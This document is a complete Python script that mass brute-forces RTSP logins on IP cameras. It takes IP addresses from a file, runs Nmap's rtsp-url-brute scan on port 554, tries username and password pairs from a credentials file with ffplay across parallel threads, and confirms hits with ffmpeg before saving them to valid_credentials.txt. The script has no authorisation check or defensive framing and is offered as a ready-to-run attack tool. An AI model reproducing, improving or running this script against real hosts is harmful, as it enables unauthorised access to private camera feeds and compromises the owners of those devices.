import os
import subprocess
import threading
import queue
import random

def run_nmap(ip):
    """Runs Nmap with the rtsp-url-brute script on the given IP and saves the output."""
    output_file = f"{ip}.txt"
    cmd = ["nmap", "--script", "rtsp-url-brute", "-p", "554", ip]
    with open(output_file, "w") as f:
        subprocess.run(cmd, stdout=f, stderr=subprocess.DEVNULL, text=True)
    print(f"[+] Nmap scan completed for {ip}, results saved in {output_file}")

def verify_success(ip, username, password):
    """Uses ffmpeg to verify if the login is actually successful."""
    rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
    print(f"[?] Verifying credentials: {rtsp_url}")

    try:
        result = subprocess.run(["ffmpeg", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "5", "-f", "null", "-"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)

        if "Unauthorized" in result.stderr or "Invalid data found" in result.stderr or "Connection refused" in result.stderr:
            print(f"[-] False positive: {rtsp_url} (Verification failed)")
            return False
        
        print(f"[+] CONFIRMED SUCCESS: {rtsp_url}")
        with open("valid_credentials.txt", "a") as f:
            f.write(f"{ip} {username}:{password}\n")
        return True
    except subprocess.TimeoutExpired:
        print(f"[-] Verification timeout: {rtsp_url}")
    
    return False

def attempt_login(ip, username, password, found_event):
    """Attempts RTSP login and verifies success."""
    if found_event.is_set():
        return  # Stop if success is already found
    
    rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
    print(f"[*] Trying {rtsp_url}")

    try:
        result = subprocess.run(["ffplay", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "7"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)

        if "401 Unauthorized" in result.stderr:
            print(f"[-] Failed: {rtsp_url} (Unauthorized)")
        elif "Invalid data found" in result.stderr or "Connection refused" in result.stderr:
            print(f"[-] Failed: {rtsp_url} (Invalid data or connection refused)")
        elif result.stderr.strip() == "" and result.stdout.strip() == "":
            print(f"[-] Failed: {rtsp_url} (Unknown failure)")
        else:
            print(f"[+] Possible success: {rtsp_url}")

            # Verify credentials before considering success
            if verify_success(ip, username, password):
                found_event.set()  # Stop further attempts

    except subprocess.TimeoutExpired:
        print(f"[-] Failed: {rtsp_url} (Timeout)")

def brute_force_worker(ip, creds_queue, found_event):
    """Worker function to process the credential queue."""
    while not creds_queue.empty() and not found_event.is_set():
        username, password = creds_queue.get()
        attempt_login(ip, username, password, found_event)
        creds_queue.task_done()

def brute_force_rtsp(ip, creds):
    """Attempts RTSP brute-force login using multiple threads for a given IP."""
    creds_queue = queue.Queue()
    found_event = threading.Event()

    # Populate the queue with all username-password combinations
    for username, password in creds:
        creds_queue.put((username, password))

    # Launch threads
    threads = []
    num_threads = min(5, len(creds))  # Limit concurrent login attempts
    for _ in range(num_threads):
        thread = threading.Thread(target=brute_force_worker, args=(ip, creds_queue, found_event))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    creds_queue.join()
    for thread in threads:
        thread.join()

def load_credentials(creds_file):
    """Loads credentials, supporting both formats:
    1. username:password (per line)
    2. Separate username and password lists (one per line, combined randomly)
    """
    with open(creds_file, "r") as f:
        lines = [line.strip() for line in f if line.strip()]

    if any(":" in line for line in lines):
        # Format: username:password per line
        return [line.split(":", 1) for line in lines]
    else:
        # Format: Separate username & password lists
        usernames = lines[:len(lines)//2]  # First half as usernames
        passwords = lines[len(lines)//2:]  # Second half as passwords
        random.shuffle(usernames)
        random.shuffle(passwords)

        # Combine randomly
        creds = [(random.choice(usernames), random.choice(passwords)) for _ in range(len(usernames) * len(passwords))]
        return creds

def worker(ip, creds):
    run_nmap(ip)
    brute_force_rtsp(ip, creds)

def main(ip_list_file, creds_file):
    if not os.path.exists(ip_list_file):
        print(f"[!] IP list file {ip_list_file} not found!")
        return
    if not os.path.exists(creds_file):
        print(f"[!] Credentials file {creds_file} not found!")
        return

    with open(ip_list_file, "r") as f:
        ips = [line.strip() for line in f if line.strip()]
    
    creds = load_credentials(creds_file)

    threads = []
    for ip in ips:
        thread = threading.Thread(target=worker, args=(ip, creds))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ip_list = "ips.txt"  # List of IPs, one per line
    creds_list = "creds.txt"  # List of credentials
    main(ip_list, creds_list)
